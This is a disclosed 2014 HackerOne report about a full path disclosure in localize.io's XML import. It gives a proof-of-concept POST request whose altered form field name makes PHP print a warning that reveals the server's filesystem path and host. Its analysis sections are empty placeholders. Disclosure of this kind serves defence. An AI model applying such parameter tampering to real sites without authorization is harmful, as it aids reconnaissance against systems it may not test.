---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '8091'
original_report_id: '8091'
title: Full Path Disclosure / Info Disclosure in Importing XML Section!
weakness: Information Disclosure
team_handle: localize
created_at: '2014-04-19T02:01:58.301Z'
disclosed_at: '2014-04-19T02:40:42.530Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- information-disclosure
---

# Full Path Disclosure / Info Disclosure in Importing XML Section!

## Metadata

- HackerOne Report ID: 8091
- Weakness: Information Disclosure
- Program: localize
- Disclosed At: 2014-04-19T02:40:42.530Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello,
I found another information disclosure vulnerability/Full Path Disclosure on your application.
now its on *Import XML* Section 

Proof of Concept
-------------------------

POST  : http://www.localize.io/import/ [project ID]
POST CONTENT: 
`-----------------------------97823247315770\r\n
Content-Disposition: form-data; name="CSRFToken"\r\n
\r\n
MTcwMTAzMDk2MDUzNTFjN2I1NGE5MWYxLjkzMjk2OTM0\r\n
-----------------------------97823247315770\r\n
Content-Disposition: form-data; name="import[overwrite][]"\r\n
\r\n
0\r\n
-----------------------------97823247315770\r\n
Content-Disposition: form-data; name="import[languageID]"\r\n
\r\n
0\r\n
-----------------------------97823247315770\r\n
Content-Disposition: form-data; name="import[groupID]"\r\n
\r\n
0\r\n
-----------------------------97823247315770\r\n
Content-Disposition: form-data; name="MAX_FILE_SIZE"\r\n
\r\n
1572864\r\n
-----------------------------97823247315770\r\n
Content-Disposition: form-data; name="importFileXML"; filename=""\r\n
Content-Type: application/octet-stream\r\n
\r\n
\r\n
-----------------------------97823247315770--\r\n`

I just Added "[]" after *import[overwrite]* and Replied.

### The information from page:
> Warning: trim() expects parameter 1 to be string, array given in /var/www/vhosts/lvps178-77-99-228.dedicated.hosteurope.de/httpdocs_localize/index.php on line 410 

I Also Added a Screenshot of that FPD as attachment..
Hope You'll fix this one also..
Thanks

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
